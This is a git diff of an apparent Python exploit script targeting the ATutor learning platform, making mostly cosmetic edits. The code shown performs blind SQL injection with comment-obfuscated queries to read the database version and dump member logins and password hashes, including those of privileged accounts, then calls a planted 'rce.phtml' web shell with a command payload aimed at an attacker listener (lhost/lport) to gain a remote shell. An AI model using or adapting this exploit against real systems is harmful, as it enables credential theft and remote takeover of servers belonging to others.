@@ -14,6 +14,7 @@ def searchFriends(ip, injStr):
 			return i
 	return None
 
+
 def count(column, ip):
 	counted = ""
 	for i in range(1, 100):
@@ -23,6 +24,7 @@ def count(column, ip):
 		except:
 			break
 	return int(counted)
+
 
 def inject(inj, ip):
 	output = ""
@@ -36,6 +38,7 @@ def inject(inj, ip):
 		except:
 			break
 	return output
+
 
 def generateHash(passwd, token):
 	m = hashlib.sha1()
@@ -101,13 +104,14 @@ def delivery(ip, user, hash, lhost, lport):
 	rce = "http://%s/mods/rce/rce.phtml?cmd=%s" % (ip, payload)
 	s.get(rce, headers=headers)
 
+
 def main():
 	parser = argparse.ArgumentParser()
 	parser.add_argument('--ip', help='Target IP address', required=True)
 	parser.add_argument('--lhost', help='Local listener IP address', required=True)
 	parser.add_argument('--lport', help='Local listener port', required=True)
 	if len(sys.argv)<=1:
-		print("[!] Usage: python3 %s --ip 192.168.0.1:80/ATutor" % sys.argv[0])
+		print("[!] Usage: python3 %s --ip 192.168.0.5:80/ATutor --lhost 192.168.0.1 --lport 8080" % sys.argv[0])
 		parser.print_help()
 		sys.exit(-1)
 	args = parser.parse_args()
@@ -115,17 +119,18 @@ def main():
 	lhost = args.lhost
 	lport = args.lport
 
-	# Commented for better performance ;)
+
 	print("\n[+] Database version")
 	query = "select/**/version()"
 	dbVersion = inject(query, ip)
 
-	print("\n\n[+] Retrieving credentials...")
+	# Commented for better performance ;)
+	'''print("\n\n[+] Retrieving credentials...")
 	usercount = count("login", ip)
 	for i in range(0, usercount):
 		query = "select/**/concat(login,0x3a,password)/**/from/**/AT_members/**/order/**/by/**/login/**/limit/**/1/**/offset/**/%d" % i
 		username = inject(query, ip)
-		print("")
+		print("")'''
 
 	print("\n[+] Retrieving credentials from a privileged account...")
 	query = "select/**/login/**/from/**/AT_members/**/where/**/status/**/=/**/3/**/limit/**/1"
